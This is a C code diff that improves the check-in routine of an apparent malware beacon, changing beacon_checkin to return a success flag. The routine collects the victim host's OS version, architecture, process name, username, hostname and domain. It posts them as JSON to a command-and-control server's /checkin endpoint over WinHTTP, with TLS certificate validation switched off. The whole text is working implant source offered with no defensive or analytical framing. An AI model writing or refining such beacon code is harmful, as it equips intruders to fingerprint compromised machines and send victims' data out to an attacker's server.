@@ -13,7 +13,7 @@ static void tls_ignore(HINTERNET hReq) {
     WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 }
 
-void beacon_checkin(BEACON_CTX *ctx) {
+BOOL beacon_checkin(BEACON_CTX *ctx) {
     char os_ver[128], arch[16], proc_name[260], uname[256], hname[256], dom[256];
     wchar_to_utf8(ctx->os_version,   os_ver,    sizeof(os_ver));
     wchar_to_utf8(ctx->arch,         arch,      sizeof(arch));
@@ -53,13 +53,13 @@ void beacon_checkin(BEACON_CTX *ctx) {
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME,
                                      WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) { HeapFree(GetProcessHeap(), 0, json); return; }
+    if (!hSession) { HeapFree(GetProcessHeap(), 0, json); return FALSE; }
 
     HINTERNET hConnect = WinHttpConnect(hSession, ctx->host, ctx->port, 0);
     if (!hConnect) {
         WinHttpCloseHandle(hSession);
         HeapFree(GetProcessHeap(), 0, json);
-        return;
+        return FALSE;
     }
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/checkin",
@@ -70,18 +70,19 @@ void beacon_checkin(BEACON_CTX *ctx) {
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
         HeapFree(GetProcessHeap(), 0, json);
-        return;
+        return FALSE;
     }
 
     tls_ignore(hRequest);
 
     DWORD json_len = (DWORD)strlen(json);
-    WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n",
-                       (DWORD)-1L, json, json_len, json_len, 0);
-    WinHttpReceiveResponse(hRequest, NULL);
+    BOOL ok = WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n",
+                                 (DWORD)-1L, json, json_len, json_len, 0) &&
+              WinHttpReceiveResponse(hRequest, NULL);
 
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
     HeapFree(GetProcessHeap(), 0, json);
+    return ok;
 }
